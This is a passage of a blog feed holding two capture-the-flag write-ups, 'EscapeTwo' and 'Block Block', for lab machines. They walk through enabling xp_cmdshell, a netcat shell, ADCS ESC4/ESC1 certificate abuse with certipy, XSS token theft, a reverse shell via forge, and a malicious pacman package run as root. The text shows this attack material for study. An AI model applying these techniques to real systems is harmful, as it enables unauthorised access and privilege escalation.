<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[BigBang]]></summary></entry><entry><title type="html">EscapeTwo-Windows-Easy</title><link href="https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7.html" rel="alternate" type="text/html" title="EscapeTwo-Windows-Easy" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7.html"><![CDATA[<h1 id="escapetwo">EscapeTwo</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>We have some initial credentials
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image.png" alt="image.png" />
<br /><br />
Anyways we also have to enumerate ports, useful information is retrieved, we have domain controler hostname
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_1.png" alt="image.png" />
<br /><br />
Enumerate users, action allowed thanks to rose credentials
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_2.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Check rose shares allowed and its permissions
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_3.png" alt="image.png" />
<br /><br />
That’s how we access to some accounting information 
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_4.png" alt="image.png" />
<br /><br />
New credentials are found
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_5.png" alt="image.png" />
<br /><br />
We might try to use SQL port to connect and execute commands as sql_svc like
<br /><br /></p>
<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">--</span> <span class="nx">Allow</span> <span class="nx">advanced</span> <span class="nx">configuration</span>
<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">show advanced options</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">RECONFIGURE</span>

<span class="o">--</span> <span class="nx">Enable</span> <span class="nx">xp_cmdshell</span>
<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">RECONFIGURE</span><span class="p">;</span>

<span class="o">--</span><span class="nx">Execute</span>
<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">RECONFIGURE</span><span class="p">;</span>
</code></pre></div></div>
<p><br /><br />
Confirm we have access, we use impacket-mysqlclient
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_6.png" alt="image.png" />
<br /><br />
Now we have to do two steps forward, first upload in a specific directory netcat, and then execute it as it follow to gain a shell as this user
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_7.png" alt="image.png" />
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_8.png" alt="image.png" />
<br /><br />
As this user we have access to database configuration
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_9.png" alt="image.png" />
<br /><br />
Check if this password is reused
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_10.png" alt="image.png" />
<br /><br />
WinRM port is open to access as ryan
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_11.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
As this box has much more users, and at this point we just have got access to three we could try to perform an Active Directory enumeration using SharpHound.exe
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_12.png" alt="image.png" />
<br /><br />
As we can see we could have control over CA_SVC account using write owner right
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_13.png" alt="image.png" />
<br /><br />
CA_SVC if member of some groups, that seems templates or something like that could be enrollable
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_14.png" alt="image.png" />
<br /><br />
Open write action using impacket-owneredit over ca_svc
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_15.png" alt="image.png" />
<br /><br />
Now modify acl to give ryan full control of ca_svc
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_16.png" alt="image.png" />
<br /><br />
As we owned ca_svc user we could use pywhisker tool to get a private certificate of ca_svc
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_17.png" alt="image.png" />
<br /><br />
Now we are able to request a Ticket Grant Ticket of this user
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_18.png" alt="image.png" />
<br /><br />
Get its NT hash to perform actions as this user
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_19.png" alt="image.png" />
<br /><br />
As previously saw, ca_svc is member of some cert groups, it might probably that user being vulnerable within its ADCS, check it using certipy
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_20.png" alt="image.png" />
<br /><br />
ESC4 is a misconfiguration which allow me to escalate privileges thanks to a write permission
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_21.png" alt="image.png" />
<br /><br />
I just need to update the configuration of the template to make it vulnerable to ESC1
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_22.png" alt="image.png" />
<br /><br />
Use this
<br /><br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> certipy-ad template <span class="nt">-k</span> <span class="nt">-template</span> DunderMifflinAuthentication <span class="nt">-dc-ip</span> 10.10.XX.XX <span class="nt">-target</span> dc01.sequel.htb
</code></pre></div></div>
<p><br /><br />
Now we have are able to authenticate and enroll using an arbitrary subject alternative name SAN
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_23.png" alt="image.png" />
<br /><br />
Request a certificate using administrator as user principal name, this will retrieve a certificate of this template as administrator
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_24.png" alt="image.png" />
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_25.png" alt="image.png" />
<br /><br />
Now that we have this .pfx file as administrator we are able to authenticate and steal the NT hash for administrator, which means privilege escalation were success
<br /><br />
<img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_26.png" alt="image.png" />
<br /><br />
Machine pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[EscapeTwo]]></summary></entry><entry><title type="html">Block-Block-Linux-Hard</title><link href="https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf.html" rel="alternate" type="text/html" title="Block-Block-Linux-Hard" /><published>2025-07-15T16:05:57+00:00</published><updated>2025-07-15T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/15/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf.html"><![CDATA[<h1 id="block-block">Block Block</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>Start with enumerating port 
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image.png" alt="image.png" />
<br /><br />
SSH is running and a web application has werkzeug behind
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_1.png" alt="image.png" />
<br /><br />
Looking around the web application we can self register and 
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_2.png" alt="image.png" />
<br /><br />
A bot is running on it
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_3.png" alt="image.png" />
<br /><br />
When we talk with the bot we are being redirected to /api/info with our jwt, that token it might be important for the foothold
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_4.png" alt="image.png" />
<br /><br />
We can also review contract source
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_5.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_6.png" alt="image.png" />
<br /><br />
Admin user is required to access to other functionalities
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_7.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_8.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
We also can report a user, it should be sended to admin, so lets try xss 
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_9.png" alt="image.png" />
<br /><br />
This would be our payload using javascript functions as we saw the web application has js on it
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_10.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_11.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_12.png" alt="image.png" />
<br /><br />
Now we can access to admin pane
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_13.png" alt="image.png" />
<br /><br />
In the source code 2 routes are disclosed
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_14.png" alt="image.png" />
<br /><br />
That is an authorization api key or something like that
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_15.png" alt="image.png" />
<br /><br />
On the other path there is an address
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_16.png" alt="image.png" />
<br /><br />
With the authorization encoded and the address we can perform a request to disclose information using as a base line the source code found as admin. Use eth_balance as the first method using the same request in the source code
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_17.png" alt="image.png" />
<br /><br />
We have no found anything in there something important is the fact that possibly ethereum is being used on this, due that method, search a little bit about it
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_18.png" alt="image.png" />
<br /><br />
 something important is the fact that possibly ethereum is being used on this, due that method, search a little bit about it
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_19.png" alt="image.png" />
<br /><br />
eth_account sounds interesting, it returns a list of addresses owned by the client
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_20.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_21.png" alt="image.png" />
<br /><br />
Here we have one, but nothing useful returned
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_22.png" alt="image.png" />
<br /><br />
this one sound good, but first we need the number
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_23.png" alt="image.png" />
<br /><br />
Let’s use this one first
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_24.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_25.png" alt="image.png" />
<br /><br />
The latest block number was returned
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_26.png" alt="image.png" />
<br /><br />
We are going to use this for return the whole block, we had to change boolean value to true due to it is question itself if the whole transactions are being included in the request
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_27.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_28.png" alt="image.png" />
<br /><br />
We have information, good. Now we need to be abe to read it, in those cases we can use something like <code class="language-plaintext highlighter-rouge">solcjs</code>  or <code class="language-plaintext highlighter-rouge">ethereum input data decoder</code> but it didn’t work here, as we can see it looks like hex, use ciberchef 
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_29.png" alt="image.png" />
<br /><br />
Effectively data is being returned but that is info about the last block that we had controlled as user role
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_30.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">0xd</code> means 13 on decimal, let’s go to the first block then
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_31.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_32.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_33.png" alt="image.png" />
<br /><br />
At the start it looks like it doesn’t have anything but in the last part of the code some plain text creds are disclosed, and that’s how we got user flag
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_34.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
Now we are keira user
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_35.png" alt="image.png" />
<br /><br />
We can execute a binary named forge, this tool helps to  build, test, fuzz, debug and deploy Solidity smart contracts. 
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_36.png" alt="image.png" />
<br /><br />
In the documentation we can find commands like init which creates a new project
<br /><br />
Once we have a new project ready for build, create a rev shell in a file which later will be call as a solc compiler instead of using the default one
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_37.png" alt="image.png" />
<br /><br />
This will create a shell as paul
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_38.png" alt="image.png" />
<br /><br />
No we can run as root pacman tool, which is a package manager, we are going to create our new malicious package, first create a file named pkgbuild which will have all the specifications on it, and let’s say it that install our payload (pwn.install)
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_39.png" alt="image.png" />
<br /><br />
This file will contain the payload we want to execute inside the post_install function
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_40.png" alt="image.png" />
<br /><br />
make the .pkg.tar.zst which is the package ready to be install
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_image_41.png" alt="image.png" />
<br /><br />
Now just install package, it will create a shell as root
<br /><br />
<img src="/assets/images/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf/3d40ada6-385a-4a20-b484-c97e61d39ddb-export-1cabfdc4-e0c5-4d94-8db1-733fb34a2bcf_a476157b_c25c_4f91_91b1_401c8184ac79.png" alt="image.png" />
<br /><br />
Machine pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Block Block]]></summary></entry></feed>